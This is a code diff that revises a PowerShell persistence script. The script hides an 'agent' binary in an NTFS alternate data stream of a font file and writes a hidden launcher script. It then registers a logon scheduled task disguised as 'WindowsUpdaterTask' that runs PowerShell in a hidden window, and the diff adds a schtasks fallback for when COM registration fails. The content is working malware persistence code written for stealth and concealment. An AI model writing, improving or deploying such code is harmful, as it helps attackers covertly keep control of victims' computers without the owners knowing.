@@ -37,7 +37,7 @@ $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
 Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
 $hiddenPath = "$fontFile`:$streamName"
 
-# --- 3. Create launcher script (run.ps1) with cleanup and progress suppression ---
+# --- 3. Create launcher script (run.ps1) with cleanup ---
 $launcherPath = "$fontDir\run.ps1"
 $launcherContent = @"
 `$ProgressPreference = 'SilentlyContinue'
@@ -59,42 +59,69 @@ Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
 attrib +h $launcherPath
 Write-Output "[+] Created launcher with cleanup: $launcherPath"
 
-# --- 4. Create scheduled task via COM (no admin, no password prompt) ---
+# --- 4. Create scheduled task (try COM, fallback to schtasks) ---
 $taskName = "WindowsUpdaterTask"
+$taskCommand = "powershell.exe -WindowStyle Hidden -File `"$launcherPath`""
+$taskCreated = $false
 
+# First try COM
 try {
-    # Suppress ALL output from COM operations with *>$null
-    $taskService = New-Object -ComObject Schedule.Service *>$null
-    $taskService.Connect() *>$null
-    $rootFolder = $taskService.GetFolder("\") *>$null
+    Write-Output "[*] Attempting to create task via COM..."
+    $taskService = New-Object -ComObject Schedule.Service
+    if (-not $taskService) { throw "Failed to create Schedule.Service object" }
+    $taskService.Connect()
+    $rootFolder = $taskService.GetFolder("\")
+    if (-not $rootFolder) { throw "Failed to get root folder" }
 
     # Delete existing task if any
     try { $rootFolder.DeleteTask($taskName, 0) *>$null } catch { }
 
-    # Create a new task definition
-    $taskDefinition = $taskService.NewTask(0) *>$null
+    $taskDefinition = $taskService.NewTask(0)
+    if (-not $taskDefinition) { throw "Failed to create task definition" }
+
     $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
     $taskDefinition.Principal.UserId = $env:USERNAME
-    $taskDefinition.Principal.LogonType = 3   # TASK_LOGON_INTERACTIVE_TOKEN
+    $taskDefinition.Principal.LogonType = 3  # TASK_LOGON_INTERACTIVE_TOKEN
 
-    # Add logon trigger
-    $trigger = $taskDefinition.Triggers.Create(9) *>$null
+    $trigger = $taskDefinition.Triggers.Create(9)  # TASK_TRIGGER_LOGON
     $trigger.UserId = $env:USERNAME
 
-    # Add action – run the launcher script
-    $action = $taskDefinition.Actions.Create(0) *>$null
+    $action = $taskDefinition.Actions.Create(0)  # TASK_ACTION_EXEC
     $action.Path = "powershell.exe"
     $action.Arguments = "-WindowStyle Hidden -File `"$launcherPath`""
 
-    # Register the task (6 = UpdateOrCreate)
-    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) *>$null
+    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
     Write-Output "[+] Scheduled task '$taskName' created/updated via COM."
+    $taskCreated = $true
 } catch {
-    Write-Output "[-] Failed to create scheduled task: $_"
+    Write-Output "[-] COM task creation failed: $_"
 }
 
-Write-Output ""
-Write-Output "✅ PERSISTENCE COMPLETE"
-Write-Output "Script location: $launcherPath"
-Write-Output "Agent hidden in: $hiddenPath"
-Write-Output "The scheduled task will run the script from the permanent folder on next logon."
+# Fallback to schtasks if COM failed
+if (-not $taskCreated) {
+    Write-Output "[*] Falling back to schtasks..."
+    try {
+        # Delete existing task if any
+        schtasks /delete /tn $taskName /f *>$null
+        # Create new task
+        schtasks /create /tn $taskName /tr "$taskCommand" /sc onlogon /ru $env:USERNAME /f /it *>$null
+        if ($LASTEXITCODE -eq 0) {
+            Write-Output "[+] Scheduled task '$taskName' created/updated via schtasks."
+            $taskCreated = $true
+        } else {
+            Write-Output "[-] schtasks failed with exit code $LASTEXITCODE"
+        }
+    } catch {
+        Write-Output "[-] schtasks exception: $_"
+    }
+}
+
+if (-not $taskCreated) {
+    Write-Output "❌ Failed to create scheduled task using any method. Persistence will not survive reboot."
+} else {
+    Write-Output ""
+    Write-Output "✅ PERSISTENCE COMPLETE"
+    Write-Output "Script location: $launcherPath"
+    Write-Output "Agent hidden in: $hiddenPath"
+    Write-Output "The scheduled task will run the script from the permanent folder on next logon."
+}
